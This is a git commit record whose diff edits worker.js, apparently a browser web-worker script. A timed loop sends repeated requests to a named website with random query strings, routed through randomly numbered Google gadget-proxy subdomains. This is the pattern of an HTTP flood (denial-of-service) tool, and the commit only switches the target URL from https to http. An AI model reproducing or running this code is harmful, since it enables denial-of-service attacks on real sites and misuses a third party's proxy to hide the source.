a5f0c13bf39a8e8f12269f5faa7627ef883a1ad9
Yusuf Dolu <38819540+yusufdolu60@users.noreply.github.com>
2018-05-04 04:51:01 +0300

    Update worker.js

--- worker.js
+++ worker.js
@@ -4,7 +4,7 @@ self.addEventListener('message', function(e) {
 
 	setInterval(function() {
 
-		var target = 'https://www.saunaetkiliatlet.com/u4.jpg?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
+		var target = 'http://www.saunaetkiliatlet.com/u4.jpg?'+Math.random().toString(36).substr(2, 7)+'='+Math.floor(Math.random() * 99999999);
 
 		var url = 'https://images'+Math.floor(Math.random() * 9999)+'-focus-opensocial.googleusercontent.com/gadgets/proxy?url='+encodeURIComponent(target)+'&container=none';
 
